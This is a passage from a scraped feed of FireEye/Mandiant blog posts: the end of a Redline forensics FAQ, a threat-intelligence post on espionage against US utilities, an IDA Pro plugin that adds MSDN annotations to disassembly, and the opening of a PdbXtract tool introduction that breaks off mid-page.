audit against both a memory image and a live machine. You can collect strings from files with the File listing audit, but this option is only available against a live machine.</p> \n <p>We do recommend restricting string collection to a single process or file at a time though, as turning strings collection on for a full process or file listing will significantly increase the amount of data returned and the time it takes to collect it.</p> \n <p> <b>Can I export the data to a file?</b></p> \n <p>Copy and Pasting from any of the list views (including Timeline), will place up to 20k selected rows onto your clipboard in CSV format. Using the right-click menu's copy options also allows you to specify if you would like to include a header row in your data or not. Full list CSV export directly to a file will be available in the next release of Redline.</p> \n <p> <b>Is the timeline feature available in Mandiant Intelligent Response</b> <sup>®</sup> <b> (MIR</b> <sup>®</sup> <b>)?</b></p> \n <p>Timeline as it exists in Redline is not available in MIR. But using the \"open with...\" feature in the MIR Console on any audit result will allow you to import your data you would like to timeline directly into Redline for analysis.</p> \n <p> <b>Is there a way to get external data sources in to Redline that are not host-based? (ex. IDS, flow, etc.)</b></p> \n <p>At the moment Redline only supports analysis of the xml data which is collected by the various Mandiant products listed above. Full schema definitions for those formats can be found <a href=\"http://schemas.mandiant.com/\">here</a>.</p> \n <p> <b>How much alteration is being done to the suspect system by Redline?</b></p> \n <p>Depending on if the collector is being run from the host's hard disk as opposed to an external drive, the collection and log files have the potential to overwrite some amount disk slack space. Also if the \"Preserve Timestamps\" option is not configured on your collector, some audits may modify the timestamps for files they touch. You can find the \"Preserve Timestamps\" option at Main Menu -&gt; Redline Options-&gt;Default Script Options-&gt;General-&gt;Preserve Timestamps\". Redline defaults this option on.</p> \n <p> <b>Prior to re-image, what is a good Redline collector that can quickly get information to sift through later?</b></p> \n <p>If the next immediate action is to re-image the box, I tend to err on the side of collecting as much information as time permits, since there will be no second chance to go back and recollect additional data. But for a little bit faster collection time, I suggest starting with the comprehensive collector and scaling back or removing the larger audits: files, registry, and processes.</p> \n <p>While the collector run times depend heavily on machine in question, it is not unheard of for the comprehensive collector to run 1-2 hours. By limiting the files audit to a specific base path like the Windows directory or the System32 directory, and limiting your registry audit to a few specific keys (i.e. HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRun) you can significantly reduce the time that your collection will take to run. If you need to collect even quicker, consider turning off the various hashes like MD5.</p> \n <p> <b>Can I run this tool via command line?</b></p> \n <p>The collector runs as a batch script via the command line, but the analysis and visualization portions are only available through the graphical user interface.</p> \n <p> <b>Are you limited to the types of variants/intrusions you can scan for?</b></p> \n <p>The Malware Risk Index (MRI) scoring configuration is limited in the types of things it allows you to look for, but within those confines you can add or tweak to your heart's content. Indicators of Compromise (IOC) provide a much more flexible definition format to describe what malware you would like to search for. The first <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/company/webinars.html\">Tools of Engagement: Redline</a> webinar walks through an example of creating a new MRI rule and an Indicator of Compromise in the course of performing the investigation and applying them to a Redline analysis.</p> \n <p> <b>Can you tell if the attacker has manipulated the time stamps of the files?</b></p> \n <p>Redline does not automatically detect timestamp manipulation. But often an experienced eye can pick it out by looking for things such as every potentially suspect files encountered having \"00\" for their seconds place, or similar statistically improbable occurrences.</p> \n <p> <b>Is there any known malware that targets Redline? Have you had any difficulties with attackers running their tools inside rootkit protection?</b></p> \n <p>We have yet to encounter any malware that has specifically attempted to avoid collection or detection by Redline and its various analysis techniques. As for general rootkit protection, Redline uses raw disk access by default where possible to avoid being subverted by rootkits.</p> \n <p> <b>What metadata shows how many times an executable has executed?</b></p> \n <p>Prefetch files (.pf) are windows specific cache files to improve application startup performance. They contain the first and last run time as well as how many executions have occurred in total. These files are parsed and their relevant data captured by the Prefetch audit available in the Redline Collector setup.</p> \n <p>That wraps up all of unanswered (as well as answered) questions! And just in case you do not already have it, the latest version of Redline (1.7 as of the time of this writing) can always be <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">found here</a>.</p> \n <p>&nbsp;</p> \n <div>\n  &nbsp;\n </div> \n <p>&nbsp;</p> \n</div>","descriptionType":"html","publishedDate":"Mon, 04 Mar 2013 23:05:03 +0000","feedId":1226,"bgimg":"","linkMd5":"dec879d8aa4dd8eeadf2ca14e73dec3b","bgimgJsdelivr":"","metaImg":"","author":"Ted Wilson","publishedOrCreatedDate":1598278264209},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Utilities Industry in the Cyber Targeting Scope","link":"http://www.fireeye.com/blog/threat-research/2013/06/utilities-industry-cyber-targeting-scope.html","description":"<div class=\"c00 c00v1\"> \n <p>There's often a lot of rhetoric in the press and in the security community around threats to the utilities industry, and risk exposure surrounding critical infrastructure. We've determined that the utilities industry (power, water, waste) has been, and likely will continue to be, a target for cyber espionage primarily from Chinese APT groups. We also anticipate that U.S. utilities infrastructure is vulnerable to computer network attack (CNA) from a variety of threat actors motivated by a desire to disrupt, deny access, or destroy. It's important to recognize the difference between actors seeking to steal data or intellectual property, and actors seeking to destroy systems or cause mass destruction. Often the distinction between computer network exploitation (CNE) and CNA gets lost in media coverage that bundles diverse cyber activity together. The type of cyber activity has implications for how we tackle the problem, thus it's key to distinguish.</p> \n <p>As part of our<a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html\" target=\"_blank\"> incident response</a> and <a href=\"https://www.mandiant.com/products/managed-defense/\" target=\"_blank\">managed defense</a> work, Mandiant has observed Chinese APT groups exploiting the computer networks of U.S. utilities enterprises servicing or providing electric power to U.S. consumers, industry, and government. The most likely targeted information for data theft in this industry includes smart grid technologies, water and waste management expertise, and negotiations information related to existing or pending deals involving Western utilities companies operating in China.</p> \n <h3>Why would Chinese APT Groups Seek to Exploit Utilities?</h3> \n <p>Since 2010, Mandiant has responded to what we assessed were Chinese cyber espionage incidents occurring at multiple utilities companies involved in electric power generation. We recognize the PRC's utilities sector for electric power development, construction, operations, and distribution is heavily concentrated on a select few state-owned enterprises (SOE) with close ties to the central government. We suspect these relationships provide APT groups with a fundamental incentive to conduct espionage to attain advanced technology and operations expertise.</p> \n <p>By way of possible motivation, the PRC is in the midst of a historic makeover that involves the transformation of urban infrastructures, which, by 2025, is likely to produce 15 mega-cities with an average of 25 million inhabitants, or about the entire population of the United States.<a title=\"\">[i]</a> The impacts from this transition are intensifying pressures on an already fragile and outdated utilities infrastructure in China that currently struggles to provide sufficient electric power, water, and waste treatment. We believe APT groups are stealing data that will allow them to improve historic PRC urbanization efforts and the modernization of infrastructure, which is receiving billions of government investment dollars for development.</p> \n <p>While we have tracked multiple attributed Chinese APT groups active in the utilities industries, we certainly don't discount that other, non-Chinese state-sponsored (or independent) actors could be engaged in data theft related to utilities.</p> \n <h3>The Risk of Disruptive Cyber Attacks</h3> \n <p>Computer network attacks (CNA) - that is, offensive cyber operations meant to disrupt or destroy-are also a threat to the utilities industry from state actors in times of major conflict. Perpetrators may include hostile adversaries, possibly nation-states, during times of escalated tensions, or terrorist operatives who gain the required expertise. The threat of a state-sponsored actor or proxy targeting this industry using CNA is a growing concern, particularly in the case of Iran, though wide-scale data theft is the primary type of threat we've observed to this point. Several large US news outlets did recently report that Iranian-based actors infiltrated some of the US' industrial control systems, however, and some have speculated their motivation in doing so was to map the network or identify resources for future attack scenarios.</p> \n <p>For more intelligence reporting and specific details related to data theft in the utilities industry, the involved actors, and other threats, consider subscribing to the <a href=\"https://www.mandiant.com/products/intelligence-center/\" target=\"_blank\">Mandiant Intelligence Center</a>.</p> \n</div>","descriptionType":"html","publishedDate":"Mon, 17 Jun 2013 20:40:56 +0000","feedId":1226,"bgimg":"","linkMd5":"d7e7df51021c1ed698f317b1e2105ae6","bgimgJsdelivr":"","metaImg":"","author":"Intel Team","publishedOrCreatedDate":1598278264221},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"FLARE IDA Pro Script Series: MSDN Annotations Plugin for Malware Analysis","link":"http://www.fireeye.com/blog/threat-research/2014/09/flare-ida-pro-script-series-msdn-annotations-ida-pro-for-malware-analysis.html","description":"<p>The FireEye Labs Advanced Reverse Engineering (FLARE) Team continues to share knowledge and tools with the community. We started this blog series with a script for <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2014/08/flare-ida-pro-script-series-automatic-recovery-of-constructed-strings-in-malware.html\">Automatic Recovery of Constructed Strings in Malware</a>. As always, you can download these scripts at the following location: <a href=\"https://github.com/fireeye/flare-ida\">https://github.com/fireeye/flare-ida</a>. We hope you find all these scripts as useful as we do.</p> \n<p>&nbsp;</p> \n<h2>Motivation</h2> \n<p>&nbsp;</p> \n<p>During my summer internship with the FLARE team, my goal was to develop IDAPython plug-ins that speed up the reverse engineering workflow in IDA Pro. While analyzing malware samples with the team, I realized that a lot of time is spent looking up information about functions, arguments, and constants at the Microsoft Developer Network (MSDN) website. Frequently switching to the developer documentation can interrupt the reverse engineering process, so we thought about ways to integrate MSDN information into IDA Pro automatically. In this blog post we will release a script that does just that, and we will show you how to use it.</p> \n<p>&nbsp;</p> \n<h2>Introduction</h2> \n<p>&nbsp;</p> \n<p>The MSDN Annotations plug-in integrates information about functions, arguments and return values into IDA Pro’s disassembly listing in the form of IDA comments. This allows the information to be integrated as seamlessly as possible. Additionally, the plug-in is able to automatically rename constants, which further speeds up the analyst workflow. The plug-in relies on an offline XML database file, which is generated from Microsoft’s documentation and IDA type library files.</p> \n<p>&nbsp;</p> \n<h2>Features</h2> \n<p>&nbsp;</p> \n<p>Table 1 shows what benefit the plug-in provides to an analyst. On the left you can see IDA Pro’s standard disassembly: seven arguments get pushed onto the stack and then the CreateFileA function is called. Normally an analyst would have to look up function, argument and possibly constant descriptions in the documentation to understand what this code snippet is trying to accomplish. To obtain readable constant values, an analyst would be required to research the respective argument, import the corresponding standard enumeration into IDA and then manually rename each value. The right side of Table 1 shows the result of executing our plug-in showing the support it offers to an analyst.</p> \n<p>The most obvious change is that constants are renamed automatically. In this example, 40000000h was automatically converted to GENERIC_WRITE. Additionally, each function argument is renamed to a unique name, so the corresponding description can be added to the disassembly.</p> \n<p> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/09/flare1.jpg\"><img width=\"555\" height=\"116\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare1.jpg\" alt=\"flare1\" class=\" wp-image-6414 landscape-med\" /></a></p> \n<p style=\"text-align: center;\">Table 1: Automatic labelling of standard symbolic constants</p> \n<p>In Figure 1 you can see how the plug-in enables you to display function, argument, and constant information right within the disassembly. The top image shows how hovering over the CreateFileA function displays a short description and the return value. In the middle image, hovering over the hTemplateFile argument displays the corresponding description. And in the bottom image, you can see how hovering over dwShareMode, the automatically renamed constant displays descriptive information.</p> \n<p style=\"text-align: center;\"> <u>Functions</u></p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/09/flare2.png\"><img width=\"495\" height=\"216\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare2.png\" alt=\"flare2\" class=\"aligncenter  wp-image-6424 landscape-sm\" /></a></p> \n<p style=\"text-align: center;\"> <u>Arguments</u></p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/09/flare3.png\"><img width=\"495\" height=\"121\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare3.png\" alt=\"flare3\" class=\"aligncenter  wp-image-6423 landscape-sm\" /></a></p> \n<p style=\"text-align: center;\"> <u>Constants</u></p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/09/flare4.png\"><img width=\"495\" height=\"176\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare4.png\" alt=\"flare4\" class=\"aligncenter  wp-image-6422 landscape-sm\" /></a></p> \n<p style=\"text-align: center;\">Figure 1: Hovering function names, arguments and constants displays the respective descriptions</p> \n<p>&nbsp;</p> \n<h2>How it works</h2> \n<p>&nbsp;</p> \n<p>Before the plug-in makes any changes to the disassembly, it creates a backup of the current IDA database file (IDB). This file gets stored in the same directory as the current database and can be used to revert to the previous markup in case you do not like the changes or something goes wrong.</p> \n<p>The plug-in is designed to run once on a sample before you start your analysis. It relies on an offline database generated from the MSDN documentation and IDA Pro type library (TIL) files. For every function reference in the import table, the plug-in annotates the function’s description and return value, adds argument descriptions, and renames constants. An example of an annotated import table is depicted in Figure 2. It shows how a descriptive comment is added to each API function call. In order to identify addresses of instructions that position arguments prior to a function call, the plug-in relies on IDA Pro’s markup.</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/09/flare5.png\"><img width=\"410\" height=\"166\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare5.png\" alt=\"flare5\" class=\"aligncenter  wp-image-6421 landscape-sm\" /></a></p> \n<p style=\"text-align: center;\">Figure 2: Annotated import table</p> \n<p>Figure 3 shows the additional .msdn segment the plug-in creates in order to store argument descriptions. This only impacts the IDA database file and does not modify the original binary.</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/09/flare6.png\"><img width=\"242\" height=\"171\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare6.png\" alt=\"flare6\" class=\"aligncenter  wp-image-6420 landscape-sm\" /></a></p> \n<p style=\"text-align: center;\">Figure 3: The additional segment added to the IDA database</p> \n<p>The .msdn segment stores the argument descriptions as shown in Figure 4. The unique argument names and their descriptive comments are sequentially added to the segment.</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/09/flare7.png\"><img width=\"500\" height=\"237\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare7.png\" alt=\"flare7\" class=\"aligncenter  wp-image-6419 landscape-sm\" /></a></p> \n<p style=\"text-align: center;\">Figure 4: Names and comments inserted for argument descriptions</p> \n<p>To allow the user to see constant descriptions by hovering over constants in the disassembly, the plug-in imports IDA Pro’s relevant standard enumeration and adds descriptive comments to the enumeration members. Figure 5 shows this for the MACRO_CREATE enumeration, which stores constants passed as dwCreationDisposition to CreateFileA.</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/09/flare8.png\"><img width=\"457\" height=\"286\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare8.png\" alt=\"flare8\" class=\"aligncenter  wp-image-6418 landscape-sm\" /></a></p> \n<p style=\"text-align: center;\">Figure 5: Descriptions added to the constant enumeration members</p> \n<p>&nbsp;</p> \n<h2>Preparing the MSDN database file</h2> \n<p>&nbsp;</p> \n<p>The plug-in’s graphical interface requires you to have the QT framework and Python scripting installed. This is included with the IDA Pro 6.6 release. You can also set it up for IDA 6.5 as described here (<a href=\"http://www.hexblog.com/?p=333\">http://www.hexblog.com/?p=333</a>).</p> \n<p>As mentioned earlier, the plug-in requires an XML database file storing the MSDN documentation. We cannot distribute the database file with the plug-in because Microsoft holds the copyright for it. However, we provide a script to generate the database file. It can be cloned from the git repository at <a href=\"https://github.com/fireeye/flare-ida\" title=\"https://github.com/fireeye/flare-ida\">https://github.com/fireeye/flare-ida</a> together with the annotation plug-in.</p> \n<p>You can take the following steps to setup the database file. You only have to do this once.</p> \n<p>&nbsp;</p> \n<ol> \n <p>&nbsp;</p> \n <li>Download and install an offline version of the MSDN documentationYou can download the Microsoft Windows SDK MSDN documentation. The standalone installer can be downloaded from <a target=\"_blank\" href=\"http://www.microsoft.com/en-us/download/details.aspx?id=18950\">http://www.microsoft.com/en-us/download/details.aspx?id=18950</a>. Although it is not the newest SDK version, it includes all the needed information and data extraction is straight-forward.As shown in Figure 6, you can select to only install the help files. By default they are located in C:\\Program Files\\Microsoft SDKs\\Windows\\v7.0\\Help\\1033.<p>&nbsp;</p> <p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/09/flare9.png\"><img width=\"340\" height=\"238\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare9.png\" alt=\"flare9\" class=\"aligncenter  wp-image-6417 landscape-sm\" /></a></p> <p style=\"text-align: center;\">Figure 6: Installing a local copy of the MSDN documentation</p> <p>&nbsp;</p> </li> \n <li>Extract the files with an archive manager like 7-zip to a directory of your choice.</li> \n <li>Download and extract tilib.exe from Hex-Ray’s download page at <a target=\"_blank\" href=\"https://www.hex-rays.com/products/ida/support/download.shtml\" title=\"https://www.hex-rays.com/products/ida/support/download.shtml\">https://www.hex-rays.com/products/ida/support/download.shtml</a>&nbsp;<p>&nbsp;</p> <p>To allow the plug-in to rename constants, it needs to know which enumerations to import. IDA Pro stores this information in TIL files located in %IDADIR%/til/. Hex-Rays provides a tool (tilib) to show TIL file contents via their download page for registered users. Download the tilib archive and extract the binary into %IDADIR%. If you run tilib without any arguments and it displays its help message, the program is running correctly.</p> </li> \n <li>Run <i>MSDN_crawler/msdn_crawler.py &lt;path to extracted MSDN documentation&gt; &lt;path to tilib.exe&gt; &lt;path to til files&gt;<p>&nbsp;</p> </i> <p> <i>&nbsp;</i></p> <p>With these prerequisites fulfilled, you can run the MSDN_crawler.py script, located in the MSDN_crawler directory. It expects the path to the TIL files you want to extract (normally %IDADIR%/til/pc/) and the path to the extracted MSDN documentation. After the script finishes execution the final XML database file should be located in the MSDN_data directory.</p> </li> \n <p>&nbsp;</p> \n</ol> \n<p>&nbsp;</p> \n<p>You can now run our plug-in to annotate your disassembly in IDA.</p> \n<p> <b>Running the MSDN annotations plug-in</b></p> \n<p>In IDA, use File - Script file... (ALT + F7) to open the script named annotate_IDB_MSDN.py. This will display the dialog box shown in Figure 7 that allows you to configure the modifications the plug-in performs. By default, the plug-in annotates functions, arguments and rename constants. If you change the settings and execute the plug-in by clicking OK, your settings get stored in a configuration file in the plug-in’s directory. This allows you to quickly run the plug-in on other samples using your preferred settings. If you do not choose to annotate functions and/or arguments, you will not be able to see the respective descriptions by hovering over the element.</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/09/flare10.png\"><img width=\"410\" height=\"116\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare10.png\" alt=\"flare10\" class=\"aligncenter  wp-image-6416 landscape-sm\" /></a></p> \n<p style=\"text-align: center;\">Figure 7: The plug-in’s configuration window showing the default settings</p> \n<p>When you choose to use repeatable comments for function name annotations, the description is visible in the disassembly listing, as shown in Figure 8.</p> \n<p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/09/flare11.png\"><img width=\"410\" height=\"116\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare11.png\" alt=\"flare11\" class=\"aligncenter  wp-image-6415 landscape-sm\" /></a></p> \n<p style=\"text-align: center;\">Figure 8: The plug-in’s preview of function annotations with repeatable comments</p> \n<p>&nbsp;</p> \n<h2>Similar Tools and Known Limitations</h2> \n<p>&nbsp;</p> \n<p>Parts of our solution were inspired by existing IDA Pro plug-ins, such as <a target=\"_blank\" href=\"https://bitbucket.org/daniel_plohmann/simplifire.idascope/\" title=\"IDAScope\">IDAScope</a> and <a target=\"_blank\" href=\"http://www.reconstructer.org/code.html\" title=\"IDAAPIHelp\">IDAAPIHelp</a>. A special thank you goes out to <a target=\"_blank\" href=\"http://blog.zynamics.com\" title=\"Zynamics\">Zynamics</a> for their <a target=\"_blank\" href=\"https://code.google.com/p/zynamics/source/browse/?repo=msdn-crawler\" title=\"MSDN Crawler\">MSDN crawler</a> and the <a target=\"_blank\" href=\"https://code.google.com/p/zynamics/source/browse/?repo=msdn-ida-plugin\" title=\"IDA importer\">IDA importer</a> which greatly supported our development.</p> \n<p>Our plug-in has mainly been tested on IDA Pro for Windows, though it should work on all platforms. Due to the structure of the MSDN documentation and limitations of the MSDN crawler, not all constants can be parsed automatically. When you encounter missing information you can extend the annotation database by placing files with supplemental information into the MSDN_data directory. In order to be processed correctly, they have to be valid XML following the schema given in the main database file (msdn_data.xml). However, if you want to extend partly existing function information, you only have to add the additional fields. Name tags are mandatory for this, as they get used to identify the respective element.</p> \n<p>For example, if the parser did not recognize a commonly used constant, we could add the information manually. For the CreateFileA function’s dwDesiredAccess argument the additional information could look similar to Listing 1.</p> \n<p>&nbsp;</p> \n<div class=\"blog-table-wrapper\"> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <table cellspacing=\"0\" cellpadding=\"0\" width=\"100%\"> \n  <tbody> \n   <tr> \n    <td><p>&nbsp;</p> <p>&nbsp;</p> \n     <div> \n      <p>&nbsp;</p> \n      <p>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;</p> \n      <p>&lt;msdn&gt;</p> \n      <p>&lt;functions&gt;</p> \n      <p>&lt;function&gt;</p> \n      <p>&lt;name&gt;CreateFileA&lt;/name&gt;</p> \n      <p>&lt;arguments&gt;</p> \n      <p>&lt;argument&gt;</p> \n      <p>&lt;name&gt;dwDesiredAccess&lt;/name&gt;</p> \n      <p>&lt;constants enums=\"MACRO_GENERIC\"&gt;</p> \n      <p>&lt;constant&gt;</p> \n      <p>&lt;name&gt;GENERIC_ALL&lt;/name&gt;</p> \n      <p>&lt;value&gt;0x10000000&lt;/value&gt;</p> \n      <p>&lt;description&gt;All possible access rights&lt;/description&gt;</p> \n      <p>&lt;/constant&gt;</p> \n      <p>&lt;constant&gt;</p> \n      <p>&lt;name&gt;GENERIC_EXECUTE&lt;/name&gt;</p> \n      <p>&lt;value&gt;0x20000000&lt;/value&gt;</p> \n      <p>&lt;description&gt;Execute access&lt;/description&gt;</p> \n      <p>&lt;/constant&gt;</p> \n      <p>&lt;constant&gt;</p> \n      <p>&lt;name&gt;GENERIC_WRITE&lt;/name&gt;</p> \n      <p>&lt;value&gt;0x40000000&lt;/value&gt;</p> \n      <p>&lt;description&gt;Write access&lt;/description&gt;</p> \n      <p>&lt;/constant&gt;</p> \n      <p>&lt;constant&gt;</p> \n      <p>&lt;name&gt;GENERIC_READ&lt;/name&gt;</p> \n      <p>&lt;value&gt;0x80000000&lt;/value&gt;</p> \n      <p>&lt;description&gt;Read access&lt;/description&gt;</p> \n      <p>&lt;/constant&gt;</p> \n      <p>&lt;/constants&gt;</p> \n      <p>&lt;/argument&gt;</p> \n      <p>&lt;/arguments&gt;</p> \n      <p>&lt;/function&gt;</p> \n      <p>&lt;/functions&gt;</p> \n      <p>&lt;/msdn&gt;</p> \n      <p>&nbsp;</p> \n     </div> </td> \n   </tr>\n  </tbody>\n </table> \n</div> \n<p>&nbsp;</p> \n<p>Listing 1: Additional information enhancing the dwDesiredAccess argument for the CreateFileA function</p> \n<p>&nbsp;</p> \n<h2>Conclusion</h2> \n<p>&nbsp;</p> \n<p>In this post, we showed how you can generate a MSDN database file used by our plug-in to automatically annotate information about functions, arguments and constants into IDA Pro’s disassembly. Furthermore, we talked about how the plug-in works, and how you can configure and customize it. We hope this speeds up your analysis process!</p> \n<p>Stay tuned for the FLARE Team’s next post where we will release solutions for the FLARE On Challenge (<a href=\"http://www.flare-on.com\" target=\"_blank\">www.flare-on.com</a>).</p> \n<p>&nbsp;</p>","descriptionType":"html","publishedDate":"Thu, 11 Sep 2014 22:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare1.jpg","linkMd5":"cc6c3768f4a41b06b832d14c48c730b0","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn7@2020_4/2020/08/24/14-11-04-934_24cc8ec1dcb23296.webp","destWidth":1542,"destHeight":324,"sourceBytes":84873,"destBytes":55708,"author":"Moritz Raabe","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare1.jpg":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn7@2020_4/2020/08/24/14-11-04-934_24cc8ec1dcb23296.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare2.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn24@2020_2/2020/08/24/14-11-10-598_29622b9f41ed8224.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare3.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn56@2020_1/2020/08/24/14-11-09-218_136b458d43e8c870.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare4.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn64@2020_3/2020/08/24/14-11-09-023_f3f95362a4c1edbd.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare5.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn7@2020_1/2020/08/24/14-11-20-208_bf99ac95b45880ee.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare6.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn90@2020_6/2020/08/24/14-11-20-696_835a346de39be3bd.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare7.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn86@2020_1/2020/08/24/14-11-19-178_933b5968a0bf76c1.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare8.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn32@2020_5/2020/08/24/14-11-19-244_42e2330bfdc84898.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare9.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn13@2020_3/2020/08/24/14-11-16-045_e696fbce9a1ff24c.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare10.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn84@2020_4/2020/08/24/14-11-09-121_0ee83a9c3c1db192.webp","https://www.fireeye.com/content/dam/legacy/blog/2014/09/flare11.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn60@2020_6/2020/08/24/14-11-10-445_e36bf542d366d4d9.webp"},"publishedOrCreatedDate":1598278264202},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Exploring Symbol Type Information with PdbXtract","link":"http://www.fireeye.com/blog/threat-research/2012/04/exploring-symbol-type-information-pdbxtract.html","description":"<div class=\"c00 c00v1\"> \n <p>Mandiant is introducing a new free tool today, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/pdbxtract.html\">PdbXtract™,</a> which allows you to browse and search PDB-type information.</p> \n <p>PdbXtract allows you to explore symbolic type information as extracted from Microsoft PDB files. This tool is primarily designed for reverse engineering Windows-based applications and for exploring the internals of Windows kernel components. You can download <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/pdbxtract.html\">PdbXtract</a>.</p> \n <p>A programming database (PDB) file is a binary file containing program debug information in a Microsoft-proprietary format. This file is produced by the compiler/linker when a program is built. The information it contains is used by debuggers to debug a program and can greatly assist a developer in debugging program issues by resolving function pointers to symbolic names, for example.</p> \n <p>Perhaps the most useful and richest source of debugging information contained in PDBs is type data which holds detailed information about data structures, constants, and other named symbols. While this information is primarily used to debug program components, it can also be used to gain insight into how core operating system components work by observing both the format of the data structure and how the structure is used.</p> \n <p>PdbXtract is not a pure PDB parser. It only extracts type information using Microsoft's DebugInterface Access (DIA) COM. If you are interested in just parsing/dumping raw PDB information, there are a few alternatives out there to DIA, including Volatility's open source pdbparse (<a href=\"http://code.google.com/p/pdbparse/\">http://code.google.com/p/pdbparse/</a>) or the PDB utility that comes with the Undocumented Windows 2000 Secrets book. However, most of the practical tools I have seen that operate on PDB's use DIA, including Microsoft's own Dia2dump, this one <a href=\"http://www.codeproject.com/Articles/37456/How-To-Inspect-the-Content-of-a-Program-Database-P\">http://www.codeproject.com/Articles/37456/How-To-Inspect-the-Content-of-a-Program-Database-P</a> and this one <a href=\"http://www.ishani.org/web/articles/obsolete/pdb-cracking-tool/\">http://www.ishani.org/web/articles/obsolete/pdb-cracking-tool/</a>, to name a few. To reiterate, PdbXtract does not parse or capture the wealth of other information available in a PDB, including: functions, debug streams, modules, publics, globals, files, section information, injected sources, source files, OEM specific types, compilands, and others.</p> \n <p>The tools mentioned above are fine for inspecting the contents of a single PDB. However, often times as part of my job in R&amp;D, we have to use knowledge of type information across all supported Windows operating systems to implement features. For example, if you are dealing with partially undocumented or \"opaque\" types (example: you need to walk the PEB's InInitializationOrderModuleList to obtain a list of loaded modules in a process) or have full source type information but do not want to tie your program to a specific version of those types as implemented in the headers of the SDK you are compiling against, you probably want to just use static offsets such as:</p> \n <pre style=\"text-align: left;\">\nPVOID NextMod=(PVOID ((DWORD_PTR)PebPtr+InInitOrderModList_Offset+Flink_Offset);\n</pre> \n <p>The problem has always been: how do I get the value of InInitOrderModList_Offset for all platforms we support, taking into account 32-bit/64-bit variations? The answer has always been: useWinDbg (or if you are interested in possibly-correct kernel symbols only, you might use Matt Suiche's Moonsols library (<a target=\"_blank\" href=\"http://msdn.moonsols.com/\">http://msdn.moonsols.com</a> )). Launch a VM for each OS you want to support, attach with a debugger, and use the power of WinDbg to extract the type information. Well, WinDbg's magical \"dt\" command just relies on the PDB information for the corresponding binary (after retrieving the necessary symbol files from your local symbol store and optionally the Microsoft public symbol server), so it stands to reason that we should be able to do the same. The end goal is to make a searchable database for all the exported types of OS binaries we care about, so that we don't have to constantly relive the tedium of doing this in WinDbg.</p> \n <p> <b>Features</b></p> \n <p>PdbXtract has two main features: exploring a single PDB (PDB Explorer) and searching a library of PDBs for one or more operating systems. PDB Explorer opens the PDB, parses type information using DIA, and displays a list of all structs, unions and enums. If you click on one of the types, a C-style struct (with offsets) definition will be displayed in the text area to the right, as shown below for the type IMAGE_FILE_HEADER.</p> \n <p> <a 